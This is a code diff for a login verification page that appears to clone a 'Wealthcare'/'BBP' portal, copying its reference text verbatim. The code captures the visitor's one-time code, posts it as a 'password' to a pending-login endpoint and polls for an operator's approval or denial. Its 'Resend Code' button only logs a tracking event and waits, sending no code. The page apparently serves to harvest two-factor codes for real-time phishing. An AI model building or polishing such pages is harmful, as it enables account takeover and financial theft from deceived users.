@@ -4,22 +4,43 @@ import Link from "next/link"
 import Image from "next/image"
 import { useEffect, useState, useRef, Suspense } from "react"
 import { useSearchParams } from "next/navigation"
-import { Phone, Mail, ArrowLeft, ArrowRight, Loader2 } from "lucide-react"
+import { Check, Lock, Mail, MessageSquare, Phone, X } from "lucide-react"
 import { Button } from "@/components/ui/button"
+import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
 import { Footer } from "@/components/footer"
+import { ThreeDotSpinner } from "@/components/ThreeDotSpinner"
 import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
 import {
   setAptiaLoginFlowStage,
   useAptiaLoginFlowGuard,
 } from "@/hooks/use-aptia-login-flow-guard"
 import {
-  BBP_PRIMARY_BUTTON_CLASS,
-  BBP_SECONDARY_BUTTON_CLASS,
+  WEALTHCARE_BUTTON_CHROME,
+  WEALTHCARE_BUTTON_GEOMETRY,
+  WEALTHCARE_NEUTRAL_BUTTON_CLASS,
 } from "@/lib/wealthcare-button-styles"
 
 const STEADY_POLL_MS = 500
 const WAIT_TIMEOUT_MS = 90 * 1000
 type OtpApprovalResult = "denied" | "timeout" | "error" | null
+
+/** Reference step-2 copy, verbatim. No masked-address line. */
+const NOTE_TEXT =
+  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function."
+
+/** Validated internally, not displayed — the reference shows no length hint. */
+const OTP_LENGTH = 6
+
+/** Chrome from the shared Wealthcare tokens; the fill is BBP's own. */
+const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME} bg-[#141c4d] hover:bg-[#407ec9] text-white disabled:opacity-70`
+
+const NEUTRAL_BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_NEUTRAL_BUTTON_CLASS} bg-[#407ec9] hover:bg-[#141c4d] text-white disabled:opacity-70`
+
+const CONTENT_COLUMN =
+  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]"
+
+const CONTENT_INNER =
+  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]"
 
 function VerifyCodeContent() {
   useAptiaLoginFlowGuard({
@@ -31,18 +52,14 @@ function VerifyCodeContent() {
   const searchParams = useSearchParams()
   const method = searchParams.get('method') || 'email'
 
-  const [maskedEmail, setMaskedEmail] = useState("**********")
-  const [maskedPhone, setMaskedPhone] = useState("***-***-****")
-  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
-  const [timeLeft, setTimeLeft] = useState(15 * 60)
+  const [code, setCode] = useState("")
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [isLoading, setIsLoading] = useState(false)
   const [isResending, setIsResending] = useState(false)
   const [resendCooldown, setResendCooldown] = useState(0)
-  const [resendSecondsLeft, setResendSecondsLeft] = useState(0)
   const [otpApprovalResult, setOtpApprovalResult] = useState<OtpApprovalResult>(null)
   const [pendingOtpId, setPendingOtpId] = useState<string | null>(null)
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
+  const inputRef = useRef<HTMLInputElement | null>(null)
   const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null)
   const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)
 
@@ -72,7 +89,7 @@ function VerifyCodeContent() {
       setIsLoading(false)
       setOtpApprovalResult('timeout')
       setErrors({ otp: 'Request timed out. Please try again.' })
-      setOtp(['', '', '', '', '', ''])
+      setCode("")
       setPendingOtpId(null)
     }, WAIT_TIMEOUT_MS)
 
@@ -95,7 +112,7 @@ function VerifyCodeContent() {
         if (status === 'denied' || status === 'expired') {
           clearPolling()
           setIsLoading(false)
-          setOtp(['', '', '', '', '', ''])
+          setCode("")
           setOtpApprovalResult(status === 'denied' ? 'denied' : 'timeout')
           setErrors({
             otp:
@@ -104,7 +121,7 @@ function VerifyCodeContent() {
                 : 'Request timed out. Please try again.',
           })
           setPendingOtpId(null)
-          inputRefs.current[0]?.focus()
+          inputRef.current?.focus()
         }
       } catch {
         // ignore temporary polling errors
@@ -126,40 +143,23 @@ function VerifyCodeContent() {
   }, [pendingOtpId])
 
   useEffect(() => {
-    try {
-      const email = sessionStorage.getItem('maskedEmail')
-      const phone = sessionStorage.getItem('maskedPhone')
-      if (email) setMaskedEmail(email)
-      if (phone) setMaskedPhone(phone)
-    } catch { }
-  }, [])
-
-  useEffect(() => {
     const denied = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('denied') : null
     const timeout = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('timeout') : null
     if (denied === '1') {
-      setOtp(['', '', '', '', '', ''])
+      setCode("")
       setOtpApprovalResult('denied')
       setErrors({ otp: 'Incorrect Code or Expired Code' })
       setIsLoading(false)
       setPendingOtpId(null)
     }
     if (timeout === '1') {
-      setOtp(['', '', '', '', '', ''])
+      setCode("")
       setOtpApprovalResult('timeout')
       setErrors({ otp: 'Request timed out. Please try again.' })
       setIsLoading(false)
       setPendingOtpId(null)
     }
   }, [])
-
-  useEffect(() => {
-    if (timeLeft <= 0) return
-    const timer = setInterval(() => {
-      setTimeLeft(prev => prev - 1)
-    }, 1000)
-    return () => clearInterval(timer)
-  }, [timeLeft])
 
   useEffect(() => {
     if (resendCooldown <= 0) return
@@ -169,70 +169,32 @@ function VerifyCodeContent() {
     return () => clearInterval(timer)
   }, [resendCooldown])
 
-  useEffect(() => {
-    if (resendSecondsLeft <= 0) return
-    const t = setInterval(() => setResendSecondsLeft(s => (s <= 1 ? 0 : s - 1)), 1000)
-    return () => clearInterval(t)
-  }, [resendSecondsLeft])
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
-    return `${mins}m ${secs.toString().padStart(2, '0')}s`
-  }
-
-  const formatShortTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
-    return `${mins}:${secs.toString().padStart(2, '0')}`
-  }
-
-  const handleOtpChange = (index: number, value: string) => {
-    const digitsOnly = value.replace(/\D/g, '')
-    if (!digitsOnly && value !== '') return
-    const newOtp = [...otp]
-    newOtp[index] = digitsOnly.slice(-1)
-    setOtp(newOtp)
+  /* Single text input — strip non-digits and cap length. No length hint is
+     shown; the reference displays no hint. */
+  const handleCodeChange = (value: string) => {
+    if (isLoading) return
+    setCode(value.replace(/\D/g, '').slice(0, OTP_LENGTH))
     if (errors.otp) {
       setErrors((prev) => ({ ...prev, otp: "" }))
     }
     if (otpApprovalResult) {
       setOtpApprovalResult(null)
     }
-    if (digitsOnly && index < 5) {
-      inputRefs.current[index + 1]?.focus()
-    }
-  }
-
-  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace' && !otp[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus()
-    }
-  }
-
-  const handleOtpPaste = (e: React.ClipboardEvent) => {
-    e.preventDefault()
-    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6)
-    const newOtp = [...otp]
-    for (let i = 0; i < pastedData.length; i++) {
-      newOtp[i] = pastedData[i]
-    }
-    setOtp(newOtp)
-    const nextIndex = Math.min(pastedData.length, 5)
-    inputRefs.current[nextIndex]?.focus()
   }
 
   const handleVerify = async () => {
     setErrors({})
     setOtpApprovalResult(null)
-    const otpCode = otp.join('')
-    if (otpCode.length !== 6) {
+    const otpCode = code
+    if (otpCode.length !== OTP_LENGTH) {
       setErrors({ otp: 'Please enter the complete 6-digit code' })
       return
     }
 
     setIsLoading(true)
     const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
+    const maskedEmailStored = sessionStorage.getItem('maskedEmail') ?? ''
+    const maskedPhoneStored = sessionStorage.getItem('maskedPhone') ?? ''
     trackFormSubmission({
       type: method === 'email' ? 'login_email_otp_verification' : 'login_text_otp_verification',
       userId,
@@ -249,8 +211,8 @@ function VerifyCodeContent() {
           userId: userId || 'login',
           password: otpCode,
           method,
-          maskedEmail,
-          maskedPhone,
+          maskedEmail: maskedEmailStored,
+          maskedPhone: maskedPhoneStored,
           flow: 'otp',
         }),
       })
@@ -258,7 +220,9 @@ function VerifyCodeContent() {
       if (!res.ok) {
         setIsLoading(false)
         setOtpApprovalResult('error')
-        setErrors({ otp: (data as { error?: string })?.error || 'Request failed. Try again.' })
+        if ((data as { error?: string })?.error)
+          console.error("[pending-login] rejected:", (data as { error?: string }).error)
+        setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
         return
       }
       if (data.id) {
@@ -270,30 +234,33 @@ function VerifyCodeContent() {
     } catch {
       setIsLoading(false)
       setOtpApprovalResult('error')
-      setErrors({ otp: 'Request failed. Try again.' })
+      setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
     }
   }
 
   const handleResend = async () => {
     if (isResending || resendCooldown > 0) return
     setIsResending(true)
-    setOtp(["", "", "", "", "", ""])
-    setTimeLeft(15 * 60)
+    setCode("")
     setErrors({})
     setOtpApprovalResult(null)
 
-    const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
-    await trackFormSubmission({
-      type: method === 'email' ? 'login_email_otp_resend' : 'login_text_otp_resend',
-      userId,
-      method,
-      page: `/login/verify-code?method=${method}`,
-    }).catch(() => { })
+    try {
+      const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
+      await trackFormSubmission({
+        type: method === 'email' ? 'login_email_otp_resend' : 'login_text_otp_resend',
+        userId,
+        method,
+        page: `/login/verify-code?method=${method}`,
+      }).catch(() => { })
 
-    await new Promise(r => setTimeout(r, 2000))
-    setIsResending(false)
-    setResendCooldown(30)
-    inputRefs.current[0]?.focus()
+      await new Promise(r => setTimeout(r, 2000))
+    } finally {
+      /* Cooldown in finally so it applies even if the wait throws. */
+      setIsResending(false)
+      setResendCooldown(30)
+      inputRef.current?.focus()
+    }
   }
 
   const isEmail = method === 'email'
@@ -326,82 +293,121 @@ function VerifyCodeContent() {
         </div>
       </header>
 
-      <main className="flex-1 flex flex-col items-center px-6 py-8">
-        <div className="w-full max-w-3xl">
-          <p className="text-center text-gray-700 mb-2">
-            Enter the verification code that you received via <strong>{isEmail ? 'email' : 'SMS'}</strong> below:
-          </p>
-          <p className="text-center text-gray-500 text-sm mb-6">
-            Note - Do not share your verification code with anyone else
-          </p>
+      <main className="flex-1 flex flex-col min-[1200px]:items-center">
+        <div className={CONTENT_COLUMN}>
+          <div className={CONTENT_INNER}>
+            <div className="mb-[18px]">
+              <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
+              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
+                {isEmail ? "An e-mail has been sent:" : "An SMS has been sent:"}
+              </p>
+              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
+                Enter the verification code that you received via{" "}
+                <strong className="font-semibold">{isEmail ? "Email" : "SMS"}</strong> below:
+              </p>
+              <p className="text-[14px] leading-[1.6] text-[#707070] text-center mt-4">
+                Note - Do not share your verification code with anyone else
+              </p>
+            </div>
 
-          <div className="flex justify-center gap-2 mb-4" onPaste={handleOtpPaste}>
-            {otp.map((digit, index) => (
-              <input
-                key={index}
-                ref={(el) => { inputRefs.current[index] = el }}
-                type="tel"
-                inputMode="numeric"
-                autoComplete="one-time-code"
-                maxLength={1}
-                value={digit}
-                autoFocus={index === 0}
-                onChange={(e) => handleOtpChange(index, e.target.value)}
-                onKeyDown={(e) => handleOtpKeyDown(index, e)}
-                className="w-12 h-12 text-center text-xl border-b-2 border-gray-400 focus:border-[#141c4d] outline-none bg-transparent"
-              />
-            ))}
-          </div>
+            {errors.otp && (
+              <p className="text-red-500 text-sm text-center mb-2" role="alert">
+                {errors.otp}
+              </p>
+            )}
 
-          <p className="text-center text-gray-600 text-sm mb-4">
-            OTP will expire in {formatTime(timeLeft)}
-          </p>
+            {/* Whole form region — code row AND buttons — swaps for the spinner. */}
+            {isLoading ? (
+              <ThreeDotSpinner label="Verifying your code" />
+            ) : (
+              <div>
+                <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
+                  <div className="w-full max-[768px]:mx-[5px] min-[1200px]:w-[200px] min-[1200px]:mr-auto">
+                    <div className="flex items-center gap-3.5">
+                      {isEmail ? (
+                        <Mail className="w-[22px] h-[22px] text-[#424242] shrink-0" aria-hidden="true" />
+                      ) : (
+                        <MessageSquare className="w-[22px] h-[22px] text-[#424242] shrink-0" aria-hidden="true" />
+                      )}
+                      <span className="text-[14px] text-gray-700 whitespace-nowrap">Confirmation Code</span>
+                    </div>
+                  </div>
+                  <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
+                    <input
+                      ref={inputRef}
+                      type="text"
+                      name="code"
+                      inputMode="numeric"
+                      autoComplete="one-time-code"
+                      value={code}
+                      onChange={(e) => handleCodeChange(e.target.value)}
+                      onPaste={(e) => {
+                        e.preventDefault()
+                        handleCodeChange(e.clipboardData.getData('text'))
+                      }}
+                      aria-label="Confirmation Code"
+                      className="w-full h-full px-3 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none"
+                    />
+                  </div>
+                </div>
 
-          {errors.otp && (
-            <p className="text-red-500 text-sm text-center mb-2">{errors.otp}</p>
-          )}
+                <div className="w-[220px] mx-auto">
+                  <Button
+                    type="button"
+                    disabled={code.length !== OTP_LENGTH}
+                    onClick={() => void handleVerify()}
+                    className={`${BUTTON_CHROME} mb-[10px]`}
+                  >
+                    <Check className="w-6 h-6 shrink-0" />
+                    <span className="flex-1 text-center truncate">Continue</span>
+                  </Button>
 
-          <p className="text-center mb-2">
-            <button
-              type="button"
-              onClick={() => void handleResend()}
-              disabled={isResending || resendCooldown > 0}
-              className="text-[#407ec9] hover:text-[#141c4d] text-sm disabled:opacity-50"
+                  <Button
+                    type="button"
+                    onClick={() => {
+                      setAptiaLoginFlowStage('2fa')
+                      window.location.href = '/login/2fa-verify'
+                    }}
+                    className={`${NEUTRAL_BUTTON_CHROME} mb-[10px]`}
+                  >
+                    <X className="w-6 h-6 shrink-0" />
+                    <span className="flex-1 text-center truncate">Cancel</span>
+                  </Button>
+
+                  {/* Not tied to verify isLoading — only to the resend lockout. */}
+                  <Button
+                    type="button"
+                    disabled={isResending || resendCooldown > 0}
+                    onClick={() => void handleResend()}
+                    className={BUTTON_CHROME}
+                  >
+                    <span className={`truncate ${isResending || resendCooldown > 0 ? "flex-1 text-center" : ""}`}>
+                      {isResending
+                        ? "Sending..."
+                        : resendCooldown > 0
+                          ? `Resend Code (${resendCooldown})`
+                          : "Resend Code"}
+                    </span>
+                  </Button>
+                </div>
+              </div>
+            )}
+
+            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
+            <div
+              role="note"
+              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
+              style={{ backgroundColor: "#F3F7A9" }}
             >
-              {isResending
-                ? 'Sending...'
-                : resendCooldown > 0
-                  ? `Resend verification code (${formatShortTime(resendCooldown)})`
-                  : 'Resend verification code'}
-            </button>
-          </p>
-
-          <div className="flex items-center justify-center gap-3">
-            <Link href="/login/2fa-verify" onClick={() => setAptiaLoginFlowStage('2fa')}>
-              <Button className={`${BBP_SECONDARY_BUTTON_CLASS} px-6 py-5 min-w-[120px]`}>
-                <ArrowLeft className="w-4 h-4 mr-2" />
-                BACK
-              </Button>
-            </Link>
-            <Button
-              className={`${BBP_PRIMARY_BUTTON_CLASS} px-6 py-5 min-w-[120px] disabled:opacity-50`}
-              onClick={() => void handleVerify()}
-              disabled={isLoading || otp.join('').length !== 6}
-            >
-              {isLoading ? (
-                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-              ) : (
-                <ArrowRight className="w-4 h-4 mr-2" />
-              )}
-              {isLoading ? 'Verifying...' : 'VERIFY'}
-            </Button>
+              <span
+                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] rounded-full border-2 border-[#414141] text-[#414141] text-[20px] leading-[31px] text-center"
+                aria-hidden="true"
+              >
+                i
+              </span>
+              <p className="m-0">{NOTE_TEXT}</p>
+            </div>
           </div>
-
-          {resendSecondsLeft > 0 && (
-            <p className="text-center text-gray-500 text-sm mt-4">
-              Resend code {Math.floor(resendSecondsLeft / 60)}:{(resendSecondsLeft % 60).toString().padStart(2, '0')}
-            </p>
-          )}
         </div>
       </main>
 
